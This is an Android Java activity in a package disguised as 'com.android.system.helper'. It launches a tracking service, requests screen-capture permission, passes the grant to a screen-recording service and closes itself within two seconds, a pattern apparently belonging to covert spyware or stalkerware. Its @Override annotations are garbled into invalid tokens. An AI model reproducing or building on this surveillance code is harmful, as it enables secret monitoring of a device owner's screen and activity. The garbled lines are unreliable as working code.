package com.android.system.helper;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;

public class MainActivity extends Activity {
    private static final int REQUEST_SCREEN = 1001;

    @id86240433 (@Override)
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        startService(new Intent(this, TrackingService.class));
        
        MediaProjectionManager pm = (MediaProjectionManager) 
            getSystemService(MEDIA_PROJECTION_SERVICE);
        if (pm != null) {
            startActivityForResult(pm.createScreenCaptureIntent(), REQUEST_SCREEN);
        }
        
        new Handler().postDelayed(() -> finish(), 2000);
    }

    @id86240433 (@Override)
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_SCREEN && resultCode == RESULT_OK) {
            Intent service = new Intent(this, ScreenService.class);
            service.putExtra("resultCode", resultCode);
            service.putExtra("data", data);
            startService(service);
        }
    }
}